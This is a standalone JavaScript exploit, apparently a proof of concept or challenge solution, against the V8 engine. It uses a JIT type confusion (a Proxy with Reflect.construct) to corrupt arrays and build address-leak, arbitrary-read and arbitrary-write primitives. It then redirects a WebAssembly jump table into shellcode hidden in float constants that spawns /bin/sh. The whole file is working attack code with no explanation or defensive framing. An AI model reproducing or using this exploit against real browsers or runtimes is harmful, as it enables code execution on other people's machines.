class Helpers {
  constructor() {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);

    this.roots = new Array(0x30000);
    this.index = 0;
  }

  pair_i32_to_f64(p1, p2) {
    this.u32[0] = p1;
    this.u32[1] = p2;
    return this.f64[0];
  }

  i64tof64(i) {
    this.u64[0] = i;
    return this.f64[0];
  }

  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[0];
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[1];
  }

  add_ref(object) {
    this.roots[this.index++] = object;
  }

  mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
  }

  scavenge_gc() {
    for (var i = 0; i < 8; i++) {
      // fill up new space external backing store bytes
      this.add_ref(new ArrayBuffer(0x200000));
    }
    this.add_ref(new ArrayBuffer(8));
  }

  hex(i) {
    return i.toString(16).padStart(16, "0");
  }

  breakpoint() {
    this.buf.slice();
  }
}

var helper = new Helpers();

// =================== //
//     Start here!     //
// =================== //

helper.scavenge_gc();
helper.mark_sweep_gc();

var a = [, , , , , , , , , , , , , , , , , , , , 1.1, 2.2, 3.3];
a.pop();
a.pop();
a.pop();
let b;
let dbl_arr;
let obj_arr;
function empty() {}

function f(p) {
  return a.push(
    Reflect.construct(empty, arguments, p)
      ? 4.1445230292290474904519183884e-317
      : 4.1445230292290474904519183884e-317
  );
}

let p = new Proxy(Object, {
  get: () => {
    a[0] = {};
    b = [1.1, 2.2, 3.3, 4.4, 5.5];
    bar = [];
    dbl_arr = [1.1, 2.2, 3.3, 4.4];
    obj_arr = [{}, {}, {}, {}];
    return Object.prototype;
  },
});

function main(p) {
  return f(p);
}

for (var i = 0; i < 0x10000; i++) {
  main(empty);
  a.pop();
  main(empty);
  a.pop();
  main(empty);
  a.pop();
  main(empty);
  a.pop();
}

main(empty);
main(empty);

main(p);

var wasmCode2 = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4,
  109, 97, 105, 110, 0, 0, 10, 73, 1, 71, 0, 68, 184, 47, 115, 104, 0, 144, 235,
  7, 68, 72, 193, 224, 32, 144, 144, 235, 7, 68, 187, 47, 98, 105, 110, 144,
  235, 7, 68, 72, 1, 216, 80, 144, 144, 235, 7, 68, 72, 137, 231, 72, 49, 246,
  235, 7, 68, 72, 49, 210, 72, 49, 192, 235, 7, 68, 176, 59, 15, 5, 144, 144,
  144, 144, 26, 26, 26, 26, 26, 26, 11,
]);
var wasmModule2 = new WebAssembly.Module(wasmCode2);
var wasmInstance2 = new WebAssembly.Instance(wasmModule2, {});
var f2 = wasmInstance2.exports.main;

var wasmCode = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
  0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
  138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

function addrof(o) {
  obj_arr[0] = o;
  return helper.ftoil(b[17]);
}

function aar(addr) {
  b[15] = helper.pair_i32_to_f64(addr - 8, 8);
  return dbl_arr[0];
}

function aaw(addr, value) {
  b[15] = helper.pair_i32_to_f64(addr - 8, 8);
  dbl_arr[0] = value;
}

let Instance_addr = addrof(wasmInstance);
console.log("Instance_addr: ", helper.hex(Instance_addr));
let jt = Instance_addr + 0x48;

let Instance2_addr = addrof(wasmInstance2);
console.log("Instance2_addr: ", helper.hex(Instance2_addr));
let jt2 = Instance2_addr + 0x48;
let jta2 = helper.f64toi64(aar(jt2));
console.log("jump table addr2: ", helper.hex(jta2));

aaw(jt, helper.i64tof64(jta2 + 0x81an));

for (var i = 0; i < 0x10000; i++) {
  f2();
}

for (var i = 0; i < 0x10000; i++) {}

f();
